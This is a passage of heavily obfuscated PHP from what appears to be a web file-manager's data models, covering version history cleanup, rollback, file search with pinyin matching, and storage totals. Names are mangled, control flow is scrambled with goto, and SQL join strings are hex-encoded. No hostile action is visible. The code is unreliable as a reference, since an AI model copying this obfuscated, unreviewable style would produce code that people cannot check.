$D©®š¥ÀÁÀ); $fƒÀËÏÔ = $GLOBALS[$f¡§ù©Åô¥[6]][$f¡§ù©Åô¥[84]][$f¡§ù©Åô¥[2298]]; if ($fƒÀËÏÔ > 1) { $this->historyAutoClear($Dª¶¤·…×—[$f¡§ù©Åô¥[369]]); $this->add($Dª¶¤·…×—); } Model($f¡§ù©Åô¥[2299])->eventFileEdit($dĞÔó·äí[$f¡§ù©Åô¥[369]]); } private function historyAutoClear($FÒ”º³óÙ‡) { goto F±Í´Ôòğæ; cù¾£·èõÁ: $BÖá„Ó†½Š = array_to_keyvalue($AàÒ‹Àïª, $béßƒ†ƒÆ³[33], $béßƒ†ƒÆ³[419]); $BÖá„Ó†½Š = array_slice($BÖá„Ó†½Š, $EË¾¶ÂÃ…‘); if (!$EªÔíË¾øœ || !$BÖá„Ó†½Š) { return; } goto D“éˆ‡ˆ†Ê; D“éˆ‡ˆ†Ê: $cŠ‡©Ÿš‘ = array($béßƒ†ƒÆ³[385] => array($béßƒ†ƒÆ³[7], $EªÔíË¾øœ)); $this->where($cŠ‡©Ÿš‘)->delete(); Model($béßƒ†ƒÆ³[422])->remove($BÖá„Ó†½Š); goto FÕÛ……ºÊÈ; F±Í´Ôòğæ: $béßƒ†ƒÆ³ =& $_SERVER[îÖ]; $DµÔ¢©É = Model($béßƒ†ƒÆ³[1082])->get($béßƒ†ƒÆ³[2300]); $bÁ¡×ÙÈ†§ = $GLOBALS[$béßƒ†ƒÆ³[6]][$béßƒ†ƒÆ³[84]][$béßƒ†ƒÆ³[2298]]; goto e¥®£ äƒ±; BÜÄœğµĞ: if (!$AàÒ‹Àïª || $EË¾¶ÂÃ…‘ >= count($AàÒ‹Àïª)) { return; } $EªÔíË¾øœ = array_to_keyvalue($AàÒ‹Àïª, $béßƒ†ƒÆ³[33], $béßƒ†ƒÆ³[367]); $EªÔíË¾øœ = array_slice($EªÔíË¾øœ, $EË¾¶ÂÃ…‘); goto cù¾£·èõÁ; e¥®£ äƒ±: $AÁ‹¾èÍˆ° = $DµÔ¢©É == $béßƒ†ƒÆ³[2301] ? 3 : $bÁ¡×ÙÈ†§; if ($bÁ¡×ÙÈ†§ <= 1) { $AÁ‹¾èÍˆ° = 1; } $EË¾¶ÂÃ…‘ = $AÁ‹¾èÍˆ° - 1; goto FĞ‰õŸƒâÕ; FĞ‰õŸƒâÕ: if ($EË¾¶ÂÃ…‘ >= 500) { return; } $cŠ‡©Ÿš‘ = array($béßƒ†ƒÆ³[383] => $FÒ”º³óÙ‡); $AàÒ‹Àïª = $this->field($béßƒ†ƒÆ³[2302])->where($cŠ‡©Ÿš‘)->order($béßƒ†ƒÆ³[2294])->select(); goto BÜÄœğµĞ; FÕÛ……ºÊÈ: } public function listData($c”˜ÚÏéö©) { goto B¸âßŠ“Õ; bùà”æ‘Æ¶: $eôğåï´µã = $this->field($däºëï§ò)->where($a¦²¬Ûˆ)->order($eëßŒŠ‰×[2294])->selectPage(); $this->_listAppendUser($eôğåï´µã[$eëßŒŠ‰×[354]]); $d£Òò‘†¸ = Model($eëßŒŠ‰×[1082])->get($eëßŒŠ‰×[2300]); goto a–¯¦·½ê˜; B¸âßŠ“Õ: $eëßŒŠ‰× =& $_SERVER[îÖ]; $a¦²¬Ûˆ = array($eëßŒŠ‰×[383] => $c”˜ÚÏéö©); $däºëï§ò = $eëßŒŠ‰×[2303]; goto bùà”æ‘Æ¶; a–¯¦·½ê˜: $bù¥Á®¬’ø = 3; if ($d£Òò‘†¸ == $eëßŒŠ‰×[2301]) { $eôğåï´µã[$eëßŒŠ‰×[354]] = array_slice($eôğåï´µã[$eëßŒŠ‰×[354]], 0, $bù¥Á®¬’ø); $eôğåï´µã[$eëßŒŠ‰×[351]] = array($eëßŒŠ‰×[2304] => 1, $eëßŒŠ‰×[2305] => 20, $eëßŒŠ‰×[2306] => 1, $eëßŒŠ‰×[2307] => count($eôğåï´µã[$eëßŒŠ‰×[354]])); } return $eôğåï´µã; goto FÃøÅ§¬Î; FÃøÅ§¬Î: } protected function _listAppendUser(&$EÎš£É“ƒ) { $a˜–ƒºá› =& $_SERVER[îÖ]; $C²ÇÈ—‹£ = array_to_keyvalue($EÎš£É“ƒ, $a˜–ƒºá›[33], $a˜–ƒºá›[1431]); $DÂŒà¯²» = Model($a˜–ƒºá›[477])->userListInfo($C²ÇÈ—‹£); foreach ($EÎš£É“ƒ as &$eøÌë„ğ´…) { $aù¹öÈçÀ = $eøÌë„ğ´…[$a˜–ƒºá›[1431]]; $eøÌë„ğ´…[$a˜–ƒºá›[378]] = $DÂŒà¯²»[$aù¹öÈçÀ] ? $DÂŒà¯²»[$aù¹öÈçÀ] : !1; } } public function fileInfo($CÀ¬˜Çˆ˜) { $A²¡í¨ñÕ¨ =& $_SERVER[îÖ]; $A¡Äìö«­¾ = $this->tablePrefix; $cÔ¡¢‹ÔÆÑ = "{$A¡Äìö«­¾}\151\157\137\146\x69\154\x65\40\146\151\154\x65\163\x20\x6f\156\40\146\x69\x6c\145\163\x2e\146\151\154\x65\x49\x44\40\x3d\40\150\151\x73\x74\157\x72\171\56\146\x69\x6c\145\111\x44"; return $this->alias($A²¡í¨ñÕ¨[2308])->where(array($A²¡í¨ñÕ¨[385] => $CÀ¬˜Çˆ˜))->join($cÔ¡¢‹ÔÆÑ, $A²¡í¨ñÕ¨[2309])->find(); } public function removeItem($B»˜»ì¿ß) { $AŠ£”®ì¿å =& $_SERVER[îÖ]; $b–¯¼£ÀË = array($AŠ£”®ì¿å[385] => $B»˜»ì¿ß); $aÕº™âôó­ = $this->where($b–¯¼£ÀË)->find(); if ($aÕº™âôó­) { $d¯ÀÈ×èô× = $this->where($b–¯¼£ÀË)->delete(); Model($AŠ£”®ì¿å[422])->remove($aÕº™âôó­[$AŠ£”®ì¿å[419]]); return $d¯ÀÈ×èô×; } return !1; } public function removeBySource($A“ĞóÒÒŞ ) { goto Cƒ¬¡õ—àó; Eèô·îƒß: $cš„ÊœïœÆ = array($CÉÌÀ¨£í[383] => array($CÉÌÀ¨£í[7], $A“ĞóÒÒŞ )); $a¸’ç‚…ŠÖ = $this->field($CÉÌÀ¨£í[420])->where($cš„ÊœïœÆ)->select(); if ($a¸’ç‚…ŠÖ) { $this->where($cš„ÊœïœÆ)->delete(); $c¯ì—óêÑ = array_to_keyvalue($a¸’ç‚…ŠÖ, $CÉÌÀ¨£í[33], $CÉÌÀ¨£í[419]); Model($CÉÌÀ¨£í[422])->remove($c¯ì—óêÑ); } goto d¼Õ¦›Ò“; d¼Õ¦›Ò“: return !0; goto FÃàÚ‹§¾í; Cƒ¬¡õ—àó: $CÉÌÀ¨£í =& $_SERVER[îÖ]; if (!$A“ĞóÒÒŞ ) { return !1; } if (!is_array($A“ĞóÒÒŞ )) { $A“ĞóÒÒŞ  = array($A“ĞóÒÒŞ ); } goto Eèô·îƒß; FÃàÚ‹§¾í: } public function setDetail($fŸÎêó³„ì, $aé­¾˜øóŒ) { $C›‹ÔùÆ´™ =& $_SERVER[îÖ]; return $this->where(array($C›‹ÔùÆ´™[385] => $fŸÎêó³„ì))->save(array($C›‹ÔùÆ´™[2297] => $aé­¾˜øóŒ)); } public function rollbackToItem($fªé‚¤³‰·, $eÂŸÈ˜æß) { goto f•ôÉÈÊĞ; eÖ§İ½÷ŞŸ: $C”Ÿƒ™´äÉ = $this->find($eÂŸÈ˜æß); $Dğ±İ‡®ßø = array($Aàçé¸ã†Ó[419] => $C”Ÿƒ™´äÉ[$Aàçé¸ã†Ó[419]], $Aàçé¸ã†Ó[77] => $C”Ÿƒ™´äÉ[$Aàçé¸ã†Ó[77]], $Aàçé¸ã†Ó[107] => time(), $Aàçé¸ã†Ó[379] => USER_ID); Model($Aàçé¸ã†Ó[752])->where(array($Aàçé¸ã†Ó[369] => $fªé‚¤³‰·))->save($Dğ±İ‡®ßø); goto DÉ“‚Ï¿È–; DÉ“‚Ï¿È–: return $this->where(array($Aàçé¸ã†Ó[385] => $eÂŸÈ˜æß))->delete(); goto aÑÎ…šËŠ”; f•ôÉÈÊĞ: $Aàçé¸ã†Ó =& $_SERVER[îÖ]; $e‡Óœµµ¥ = Model($Aàçé¸ã†Ó[752])->sourceInfo($fªé‚¤³‰·); $this->addHistory($e‡Óœµµ¥); goto eÖ§İ½÷ŞŸ; aÑÎ…šËŠ”: } public function clearSame($F–¦ˆêÊÖ—) { goto C‘à»ÜÁõæ; A“ŒÜ‡ˆ: $dõİçº‹¨ = array(); $B¥­­ŠŞ‹ø = array(); foreach ($EŠñÓäŞÌ as $aª½ŸàÒÚğ) { if (!$aª½ŸàÒÚğ || count($aª½ŸàÒÚğ) <= 1) { continue; } foreach ($aª½ŸàÒÚğ as $aÁˆ²š§‹Ä) { $dõİçº‹¨[] = $aÁˆ²š§‹Ä[$AâÃÀäÌÒ©[419]]; $B¥­­ŠŞ‹ø[] = $aÁˆ²š§‹Ä[$AâÃÀäÌÒ©[367]]; } } goto EÑ ”ìÍÇ©; EÑ ”ìÍÇ©: if (!$B¥­­ŠŞ‹ø) { return; } $this->where(array($AâÃÀäÌÒ©[367] => array($AâÃÀäÌÒ©[7], $B¥­­ŠŞ‹ø)))->delete(); Model($AâÃÀäÌÒ©[422])->remove($dõİçº‹¨); goto Fœ©ÙŒ¢; C‘à»ÜÁõæ: $AâÃÀäÌÒ© =& $_SERVER[îÖ]; $eŠ­Ìà‚Í = $this->listData($F–¦ˆêÊÖ—); $EŠñÓäŞÌ = array_to_keyvalue_group($eŠ­Ìà‚Í, $AâÃÀäÌÒ©[419]); goto A“ŒÜ‡ˆ; Fœ©ÙŒ¢: } public function userSpace() { $BÎŠì‹¸ä =& $_SERVER[îÖ]; $e¿·ôîˆõ = $this->tablePrefix; $e¢ÀêÔª‡æ = array($BÎŠì‹¸ä[1422] => USER_ID); $C‹‚åÄÈ = "{$e¿·ôîˆõ}\x69\157\137\146\151\x6c\x65\40\x66\151\x6c\x65\163\40\x6f\x6e\40\146\x69\x6c\x65\163\56\146\151\154\x65\x49\x44\x20\75\40\x68\151\x73\164\157\162\171\56\x66\151\154\x65\x49\x44"; return $this->alias($BÎŠì‹¸ä[2308])->where($e¢ÀêÔª‡æ)->join($C‹‚åÄÈ, $BÎŠì‹¸ä[2309])->sum($BÎŠì‹¸ä[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($BÔ®ÓöÙğ¡) { goto C‡ÏÏ´´µ”; dó§”ğ’äÅ: if (!$a†‡ŒÄˆç) { return array(); } $bŞò·åë„˜ = $a†‡ŒÄˆç[$D¿ÕƒƒÓáˆ[160]]; $FÂ”Ä ‹™ = $D¿ÕƒƒÓáˆ[7]; goto e¦îˆ¦””Ä; C‡ÏÏ´´µ”: $D¿ÕƒƒÓáˆ =& $_SERVER[îÖ]; $e±×”ÙÏÔù = KodIO::fileTypeList(); $a†‡ŒÄˆç = $e±×”ÙÏÔù[$BÔ®ÓöÙğ¡]; goto dó§”ğ’äÅ; e¦îˆ¦””Ä: if (!$a†‡ŒÄˆç[$D¿ÕƒƒÓáˆ[160]]) { $cò‚ˆøÏ³ö = array_to_keyvalue($e±×”ÙÏÔù, $D¿ÕƒƒÓáˆ[33], $D¿ÕƒƒÓáˆ[160]); $bŞò·åë„˜ = implode($D¿ÕƒƒÓáˆ[47], $cò‚ˆøÏ³ö); $FÂ”Ä ‹™ = $D¿ÕƒƒÓáˆ[2260]; } $BŠß÷å—¿ = explode($D¿ÕƒƒÓáˆ[47], trim($bŞò·åë„˜, $D¿ÕƒƒÓáˆ[47])); return array($FÂ”Ä ‹™, $BŠß÷å—¿); goto E‰“ƒÍáË”; E‰“ƒÍáË”: } public function listPathType($Dó¥ÄÈæº‹) { $EöÄ†Ú‹óæ =& $_SERVER[îÖ]; $fÎïÉ·ÊÖ¡ = $this->fileTypeWhere($Dó¥ÄÈæº‹); if (!$fÎïÉ·ÊÖ¡) { return array(); } $bÓ…·±ã¬ä = array($EöÄ†Ú‹óæ[521] => SourceModel::TYPE_USER, $EöÄ†Ú‹óæ[522] => USER_ID, $EöÄ†Ú‹óæ[518] => 0, $EöÄ†Ú‹óæ[519] => $fÎïÉ·ÊÖ¡); return $this->listSource($bÓ…·±ã¬ä); } public function listSearch($Cêâ¡µí, $F¾‘ç±ïÓÅ = 300) { goto e©›í†Ø¸á; d“¦ùîÈë¢: if (!isset($B¬©ë¼˜Ÿé[$b¶œ…†™ƒÜ[397]])) { $B¬©ë¼˜Ÿé[$b¶œ…†™ƒÜ[397]] = 0; } $fÕÅÙˆ’×’ = $b¶œ…†™ƒÜ[2311]; $aòÏ¿£ = $fÕÅÙˆ’×’; goto Eë”×²º«ç; Eë”×²º«ç: $this->_listSearchBindPinyin($Cêâ¡µí, $B¬©ë¼˜Ÿé, $fÕÅÙˆ’×’); $this->alias($b¶œ…†™ƒÜ[487])->_makeOrder()->cache(null, 10); $aÒ‘Ú’Îî = $this->distinct(!0)->field($fÕÅÙˆ’×’)->where($B¬©ë¼˜Ÿé)->selectPage($F¾‘ç±ïÓÅ); goto D½±Æï‡æ; EíøÖ½¯Óƒ: $this->_listMake($aÒ‘Ú’Îî); return $aÒ‘Ú’Îî; goto bòğ œ…õè; D½±Æï‡æ: $this->_listSearchDesc($aÒ‘Ú’Îî, $Cêâ¡µí, $aòÏ¿£); $this->_listSearchTag($aÒ‘Ú’Îî, $Cêâ¡µí, $aòÏ¿£); $this->_listDataApply($aÒ‘Ú’Îî[$b¶œ…†™ƒÜ[354]]); goto EíøÖ½¯Óƒ; e©›í†Ø¸á: $b¶œ…†™ƒÜ =& $_SERVER[îÖ]; if (isset($Cêâ¡µí[$b¶œ…†™ƒÜ[2177]]) && $Cêâ¡µí[$b¶œ…†™ƒÜ[2177]]) { $Cêâ¡µí[$b¶œ…†™ƒÜ[2177]] = str_replace($b¶œ…†™ƒÜ[1587], $b¶œ…†™ƒÜ[2310], trim($Cêâ¡µí[$b¶œ…†™ƒÜ[2177]])); } $B¬©ë¼˜Ÿé = $this->_parseSearchWhere($Cêâ¡µí); goto d“¦ùîÈë¢; bòğ œ…õè: } private function _listSearchTag(&$FÌ¢ÜßöÀá, $a¬ğ‡ìÅ, $EÑİ˜ĞÔï¸) { goto cÛÁï‰’Ö³; FõÄÓà‰¸ğ: $B™…Û¡¥Ş = array(); $e¡Á„äÛ = $a¬ğ‡ìÅ[$C¿ª„áóµ[2177]]; foreach ($b¤…ô‘Ìù as $FŠàöƒã‹î) { $FÃÙ ™ˆ¥ = $FŠàöƒã‹î[$C¿ª„áóµ[28]]; $FÈÑ†—Á = str_replace($C¿ª„áóµ[50], $C¿ª„áóµ[33], Pinyin::encode($FÃÙ ™ˆ¥)); if (stripos($FÃÙ ™ˆ¥, $e¡Á„äÛ) !== !1 || stripos($FÈÑ†—Á, $e¡Á„äÛ) !== !1) { $B™…Û¡¥Ş[] = $FŠàöƒã‹î[$C¿ª„áóµ[367]]; } } goto aÓø·§™è; c»æä±¿ğ: $E¾à² ¾ = array_to_keyvalue($E¾à² ¾, $C¿ª„áóµ[33], $C¿ª„áóµ[75]); $cç©”ğğ¦Í = array_unique($E¾à² ¾); $this->_listSearchMerge($FÌ¢ÜßöÀá, $a¬ğ‡ìÅ, $EÑİ˜ĞÔï¸, $cç©”ğğ¦Í); goto A‘ÚÑÊñÃ§; cÛÁï‰’Ö³: $C¿ª„áóµ =& $_SERVER[îÖ]; if (!$a¬ğ‡ìÅ[$C¿ª„áóµ[2177]] || $FÌ¢ÜßöÀá[$C¿ª„áóµ[351]][$C¿ª„áóµ[340]] > 1) { return; } $b¤…ô‘Ìù = Model($C¿ª„áóµ[2312])->listData(); goto FõÄÓà‰¸ğ; aÓø·§™è: if (!$B™…Û¡¥Ş) { return; } $dÂİ­¦ÉÙ· = array($C¿ª„áóµ[393] => array($C¿ª„áóµ[7], $B™…Û¡¥Ş)); $E¾à² ¾ = Model($C¿ª„áóµ[394])->field($C¿ª„áóµ[75])->where($dÂİ­¦ÉÙ·)->select(); goto c»æä±¿ğ; A‘ÚÑÊñÃ§: } private function _listSearchDesc(&$a¾ğ³ÍíÀŞ, $cÒÍ™²óİ‡, $eÚ«—àÖ—Ş) { goto E“¬‰ÄÕª«; F¡…×ïè‡ä: $fš™Á½Áø– = Model($aº¡•ĞÖ„[504])->field($aº¡•ĞÖ„[369])->where($b‘¨ñŞ¤Î”)->select(); $FæÍáŞåô¼ = array_to_keyvalue($fš™Á½Áø–, $aº¡•ĞÖ„[33], $aº¡•ĞÖ„[369]); $this->_listSearchMerge($a¾ğ³ÍíÀŞ, $cÒÍ™²óİ‡, $eÚ«—àÖ—Ş, $FæÍáŞåô¼); goto bšÓùíÙ•Ú; DÃìŸ©¤Ò: $ešâ†Ë¨ºÙ = array_unique($ešâ†Ë¨ºÙ); if (!$ešâ†Ë¨ºÙ) { return; } $b‘¨ñŞ¤Î” = array($aº¡•ĞÖ„[369] => array($aº¡•ĞÖ„[7], $ešâ†Ë¨ºÙ), $aº¡•ĞÖ„[89] => $aº¡•ĞÖ„[405], $aº¡•ĞÖ„[359] => array($aº¡•ĞÖ„[751], $aº¡•ĞÖ„[2179] . $cÒÍ™²óİ‡[$aº¡•ĞÖ„[2177]] . $aº¡•ĞÖ„[2179])); goto F¡…×ïè‡ä; E“¬‰ÄÕª«: $aº¡•ĞÖ„ =& $_SERVER[îÖ]; if (!$cÒÍ™²óİ‡[$aº¡•ĞÖ„[2177]] || $a¾ğ³ÍíÀŞ[$aº¡•ĞÖ„[351]][$aº¡•ĞÖ„[340]] > 1) { return; } $ešâ†Ë¨ºÙ = $this->listSearchChildren($cÒÍ™²óİ‡[$aº¡•ĞÖ„[461]]); goto DÃìŸ©¤Ò; bšÓùíÙ•Ú: } private function _listSearchMerge(&$eË’ì¼õŞİ, $A±ö›îéŞ¥, $f‚Ïè®öâ, $D² œá£¶‡) { goto BÃã†®‡Á£; B™³ëŸŒ: foreach ($DË®¨ÉÆ§Ë as $dÖÕ²æÆÂä) { $cÁÓÊ«ó‰ = $b ÂŒÀÄ¯[47] . $A±ö›îéŞ¥[$b ÂŒÀÄ¯[461]] . $b ÂŒÀÄ¯[47]; if (stripos($dÖÕ²æÆÂä[$b ÂŒÀÄ¯[459]], $cÁÓÊ«ó‰) !== !1) { $AÃ¿šƒù˜”[] = $dÖÕ²æÆÂä; } } $eË’ì¼õŞİ[$b ÂŒÀÄ¯[354]] = array_merge($AÃ¿šƒù˜”, $eË’ì¼õŞİ[$b ÂŒÀÄ¯[354]]); $eË’ì¼õŞİ[$b ÂŒÀÄ¯[351]][$b ÂŒÀÄ¯[352]] += count($AÃ¿šƒù˜”); goto AºÊµêÖùö; FÈ‚Êí›™é: $d¿·‚Š§” = array_diff($D² œá£¶‡, $b¹ìˆ¥µ®¤); if (!$d¿·‚Š§”) { return; } $F¸íØÃÂ‰Ò = array($b ÂŒÀÄ¯[369] => array($b ÂŒÀÄ¯[7], $d¿·‚Š§”)); goto aˆøĞ¯›¡Î; aˆøĞ¯›¡Î: $DË®¨ÉÆ§Ë = $this->field($f‚Ïè®öâ)->where($F¸íØÃÂ‰Ò)->select(); if (!$DË®¨ÉÆ§Ë) { return; } $AÃ¿šƒù˜” = array(); goto B™³ëŸŒ; BÃã†®‡Á£: $b ÂŒÀÄ¯ =& $_SERVER[îÖ]; if (!$D² œá£¶‡) { return; } $b¹ìˆ¥µ®¤ = array_to_keyvalue($eË’ì¼õŞİ[$b ÂŒÀÄ¯[354]], $b ÂŒÀÄ¯[33], $b ÂŒÀÄ¯[369]); goto FÈ‚Êí›™é; AºÊµêÖùö: } public function listSearchChildren($a‚ˆéĞ¡ÃÎ, $f‘ğ¤¡Éõ = 5000) { goto C‡âø˜êÉ; C‡âø˜êÉ: $e¿“Éƒ¹¸ =& $_SERVER[îÖ]; $d†Ø¤ª¢Ğğ = array(); $EŸ™ãÅÚ» = $this->sourceInfo($a‚ˆéĞ¡ÃÎ); goto F‘ôëÅ‚†; B²Ù¥¼¿å¨: $D–ÊÊîŒÁ = $this->field($e¿“Éƒ¹¸[369])->where($E¿°ø‹îÑÚ)->select(); $d†Ø¤ª¢Ğğ = array_to_keyvalue($D–ÊÊîŒÁ, $e¿“Éƒ¹¸[33], $e¿“Éƒ¹¸[369]); return $d†Ø¤ª¢Ğğ; goto e©Œïµ’ˆÒ; F‘ôëÅ‚†: $E¿°ø‹îÑÚ = array($e¿“Éƒ¹¸[459] => array($e¿“Éƒ¹¸[751], $EŸ™ãÅÚ»[$e¿“Éƒ¹¸[459]] . $EŸ™ãÅÚ»[$e¿“Éƒ¹¸[369]] . $e¿“Éƒ¹¸[484])); $D«‹”¤µ§° = $this->field($e¿“Éƒ¹¸[369])->cache(null, 600)->where($E¿°ø‹îÑÚ)->count(); if ($D«‹”¤µ§° > $f‘ğ¤¡Éõ) { return $this->_listSearchChildrenNear($a‚ˆéĞ¡ÃÎ, $f‘ğ¤¡Éõ); } goto B²Ù¥¼¿å¨; e©Œïµ’ˆÒ: } private function _listSearchChildrenNear($BŒµ¯ÙÔ—Ò, $aôï¢Ë¸ğƒ) { goto F‡åĞõ¡Œ; dááíÈÆôÁ: $B ÛÀÌô¤ = array_merge($B ÛÀÌô¤, array_to_keyvalue($AÚ²©ÄöÊè, $Eœ²›œ¦ÛÒ[33], $Eœ²›œ¦ÛÒ[369])); $B ÛÀÌô¤ = array_slice($B ÛÀÌô¤, 0, $aôï¢Ë¸ğƒ); return $B ÛÀÌô¤; goto A™Ó´ƒ‹ù§; Aß‘®øÌ’¬: if (!$EŒ³é²•·×) { return $B ÛÀÌô¤; } $bÍ‘‹öÕ¢’ = array($Eœ²›œ¦ÛÒ[461] => array($Eœ²›œ¦ÛÒ[7], $EŒ³é²•·×)); $AÚ²©ÄöÊè = $this->field($Eœ²›œ¦ÛÒ[2313])->where($bÍ‘‹öÕ¢’)->select(); goto dááíÈÆôÁ; F‡åĞõ¡Œ: $Eœ²›œ¦ÛÒ =& $_SERVER[îÖ]; $B ÛÀÌô¤ = array(); $bÍ‘‹öÕ¢’ = array($Eœ²›œ¦ÛÒ[461] => $BŒµ¯ÙÔ—Ò); goto a÷œä¾Ïµ£; a÷œä¾Ïµ£: $AÚ²©ÄöÊè = $this->field($Eœ²›œ¦ÛÒ[2313])->where($bÍ‘‹öÕ¢’)->select(); $EŒ³é²•·× = array_to_keyvalue(array_filter_by_field($AÚ²©ÄöÊè, $Eœ²›œ¦ÛÒ[370], $Eœ²›œ¦ÛÒ[83]), $Eœ²›œ¦ÛÒ[33], $Eœ²›œ¦ÛÒ[369]); $B ÛÀÌô¤ = array_merge($B ÛÀÌô¤, array_to_keyvalue($AÚ²©ÄöÊè, $Eœ²›œ¦ÛÒ[33], $Eœ²›œ¦ÛÒ[369])); goto Aß‘®øÌ’¬; A™Ó´ƒ‹ù§: } private function _listSearchBindPinyin($A“¨¯ƒ”Ìƒ, &$b‡Ù¬”§œŠ, &$F·á‰ÉóÃÀ) { goto d¤¼²Ìî§; F©†™Ä…Ï˜: $EâŒˆ«—À¼[] = array($bìÍ†•Ä“¢[2317] => $aí¢•µ×˜˜, $bìÍ†•Ä“¢[908] => $bìÍ†•Ä“¢[2181], array($bìÍ†•Ä“¢[2318] => $aí¢•µ×˜˜, $bìÍ†•Ä“¢[2319] => array($bìÍ†•Ä“¢[7], array($bìÍ†•Ä“¢[416], $bìÍ†•Ä“¢[415])))); $this->join($fŠÖ¢ÕùïÑ); $b‡Ù¬”§œŠ = $EâŒˆ«—À¼; goto BàâÜÚ‹¢ó; AˆÂ½‹«Á’: unset($b‡Ù¬”§œŠ[$bìÍ†•Ä“¢[28]]); foreach ($b‡Ù¬”§œŠ as $B’ºİ‚Àìœ => $b—™½Ü–‹) { $EâŒˆ«—À¼[$bìÍ†•Ä“¢[2315] . $B’ºİ‚Àìœ] = $b—™½Ü–‹; } $aí¢•µ×˜˜ = array($bìÍ†•Ä“¢[483], $bìÍ†•Ä“¢[2179] . $A“¨¯ƒ”Ìƒ[$bìÍ†•Ä“¢[2177]] . $bìÍ†•Ä“¢[2179]); goto F©†™Ä…Ï˜; eÂİ°ÍØó: $EâŒˆ«—À¼ = array(); $F·á‰ÉóÃÀ = str_replace(array($bìÍ†•Ä“¢[217], $bìÍ†•Ä“¢[50], $bìÍ†•Ä“¢[2314]), $bìÍ†•Ä“¢[33], $F·á‰ÉóÃÀ); $F·á‰ÉóÃÀ = $bìÍ†•Ä“¢[2315] . str_replace($bìÍ†•Ä“¢[47], $bìÍ†•Ä“¢[2316], $F·á‰ÉóÃÀ); goto AˆÂ½‹«Á’; d¤¼²Ìî§: $bìÍ†•Ä“¢ =& $_SERVER[îÖ]; if (!Input::check($A“¨¯ƒ”Ìƒ[$bìÍ†•Ä“¢[2177]], $bìÍ†•Ä“¢[306]) || strlen($A“¨¯ƒ”Ìƒ[$bìÍ†•Ä“¢[2177]]) < 2) { return; } $fŠÖ¢ÕùïÑ = "\x4c\x45\106\124\40\x4a\x4f\111\x4e\40{$this->tablePrefix}\x69\x6f\x5f\163\x6f\165\162\x63\x65\137\155\x65\164\141\x20\155\145\x74\141\x20\157\x6e\x20\163\157\165\162\143\145\56\163\x6f\165\x72\x63\145\x49\104\x20\x3d\x20\155\145\x74\x61\x2e\163\x6f\x75\162\x63\x65\x49\104"; goto eÂİ°ÍØó; BàâÜÚ‹¢ó: } private function _parseSearchWhere($eèÜ±·ğß„) { goto Eà¡Ì†·õì; B Á·ô†Ş: if (isset($eèÜ±·ğß„[$Eã‘ ôí–“[702]])) { $A‰¥æ‡ßÃÔ = array($Eã‘ ôí–“[2321], $eèÜ±·ğß„[$Eã‘ ôí–“[702]]); if ($BÛÅ†°°åØ[$Eã‘ ôí–“[107]]) { $BÛÅ†°°åØ[$Eã‘ ôí–“[107]] = array($BÛÅ†°°åØ[$Eã‘ ôí–“[107]], $A‰¥æ‡ßÃÔ, $Eã‘ ôí–“[2322]); } else { $BÛÅ†°°åØ[$Eã‘ ôí–“[107]] = $A‰¥æ‡ßÃÔ; } } if (isset($eèÜ±·ğß„[$Eã‘ ôí–“[2323]])) { $BÛÅ†°°åØ[$Eã‘ ôí–“[77]] = array($Eã‘ ôí–“[2320], $eèÜ±·ğß„[$Eã‘ ôí–“[2323]]); } if (isset($eèÜ±·ğß„[$Eã‘ ôí–“[2324]])) { $A‰¥æ‡ßÃÔ = array($Eã‘ ôí–“[2321], $eèÜ±·ğß„[$Eã‘ ôí–“[2324]]); if ($BÛÅ†°°åØ[$Eã‘ ôí–“[77]]) { $BÛÅ†°°åØ[$Eã‘ ôí–“[77]] = array($BÛÅ†°°åØ[$Eã‘ ôí–“[77]], $A‰¥æ‡ßÃÔ, $Eã‘ ôí–“[2322]); } else { $BÛÅ†°°åØ[$Eã‘ ôí–“[77]] = $A‰¥æ‡ßÃÔ; } } goto B®¸±¯; Eà¡Ì†·õì: $Eã‘ ôí–“ =& $_SERVER[îÖ]; $BÛÅ†°°åØ = array(); if (isset($eèÜ±·ğß„[$Eã‘ ôí–“[701]])) { $BÛÅ†°°åØ[$Eã‘ ôí–“[107]] = array($Eã‘ ôí–“[2320], $eèÜ±·ğß„[$Eã‘ ôí–“[701]]); } goto B Á·ô†Ş; B®¸±¯: if (isset($eèÜ±·ğß„[$Eã‘ ôí–“[535]])) { $BÛÅ†°°åØ[] = array($Eã‘ ôí–“[379] => $eèÜ±·ğß„[$Eã‘ ôí–“[535]], $Eã‘ ôí–“[378] => $eèÜ±·ğß„[$Eã‘ ôí–“[535]], $Eã‘ ôí–“[908] => $Eã‘ ôí–“[2181]); } if (isset($eèÜ±·ğß„[$Eã‘ ôí–“[372]])) { $cÆ®§â¬‚¤ = $eèÜ±·ğß„[$Eã‘ ôí–“[372]]; if ($cÆ®§â¬‚¤ == $Eã‘ ôí–“[76]) { $BÛÅ†°°åØ[$Eã‘ ôí–“[370]] = 1; } else { if ($cÆ®§â¬‚¤ == $Eã‘ ôí–“[2325]) { $BÛÅ†°°åØ[$Eã‘ ôí–“[370]] = 0; } else { if ($cÆ®§â¬‚¤) { $cÆ®§â¬‚¤ = is_array($cÆ®§â¬‚¤) ? $cÆ®§â¬‚¤ : explode($Eã‘ ôí–“[47], $cÆ®§â¬‚¤); $BÛÅ†°°åØ[$Eã‘ ôí–“[372]] = array($Eã‘ ôí–“[384], $cÆ®§â¬‚¤); $BÛÅ†°°åØ[$Eã‘ ôí–“[370]] = 0; } } } } if (isset($eèÜ±·ğß„[$Eã‘ ôí–“[461]])) { $fÆ ØçŸÍ = $this->sourceInfo($eèÜ±·ğß„[$Eã‘ ôí–“[461]]); $BÛÅ†°°åØ[$Eã‘ ôí–“[525]] = array($Eã‘ ôí–“[483], $fÆ ØçŸÍ[$Eã‘ ôí–“[459]] . $eèÜ±·ğß„[$Eã‘ ôí–“[461]] . $Eã‘ ôí–“[484]); } goto B††Ù‹¹çè; B††Ù‹¹çè: if (isset($eèÜ±·ğß„[$Eã‘ ôí–“[2177]]) && $eèÜ±·ğß„[$Eã‘ ôí–“[2177]]) { $a°îø©‡†” = $eèÜ±·ğß„[$Eã‘ ôí–“[2177]]; $cŞé­¶Ôï = explode($Eã‘ ôí–“[50], $a°îø©‡†”); if (strlen($a°îø©‡†”) > 2 && (substr($a°îø©‡†”, 0, 1) == $Eã‘ ôí–“[113] && substr($a°îø©‡†”, -1) == $Eã‘ ôí–“[113]) || substr($a°îø©‡†”, 0, 1) == $Eã‘ ôí–“[55] && substr($a°îø©‡†”, -1) == $Eã‘ ôí–“[55]) { $a°îø©‡†” = substr($a°îø©‡†”, 1, -1); $cŞé­¶Ôï = array($a°îø©‡†”); } $BÛÅ†°°åØ[$Eã‘ ôí–“[28]] = array($Eã‘ 